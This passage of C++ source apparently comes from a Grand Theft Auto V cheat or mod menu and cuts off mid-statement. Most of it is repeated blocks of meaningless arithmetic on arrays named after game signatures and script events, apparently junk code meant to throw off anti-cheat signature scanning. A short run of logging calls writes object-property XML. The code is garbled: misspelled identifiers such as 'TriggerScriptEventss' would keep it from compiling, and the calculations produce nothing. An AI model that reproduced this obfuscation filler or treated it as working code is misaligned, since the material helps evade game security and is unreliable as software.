			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			Extern_Reader::LOG::LogSemHora("</ObjectProperties>");
			Extern_Reader::LOG::LogSemHora("<OpacityLevel>255</OpacityLevel>");
			Extern_Reader::LOG::LogSemHora("<LodDistance>16960</LodDistance>");
			Extern_Reader::LOG::LogSemHora("<IsVisible>true</IsVisible>");
			Extern_Reader::LOG::LogSemHora("<MaxHealth>1000</MaxHealth>");
			Extern_Reader::LOG::LogSemHora("<Health>1000</Health>");
			Extern_Reader::LOG::LogSemHora("<HasGravity>true</HasGravity>");
			Extern_Reader::LOG::LogSemHora("<IsOnFire>false</IsOnFire>");
			Extern_Reader::LOG::LogSemHora("<IsInvincible>false</IsInvincible>");
			Extern_Reader::LOG::LogSemHora("<IsBulletProof>false</IsBulletProof>");
			Extern_Reader::LOG::LogSemHora("<IsCollisionProof>false</IsCollisionProof>");
			Extern_Reader::LOG::LogSemHora("<IsExplosionProof>false</IsExplosionProof>");

			if (offset > aaaaaa)
			{
				matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[3] = (0xB1231 * 0xA) - (ponteiro * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) - offset;
				matriz[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
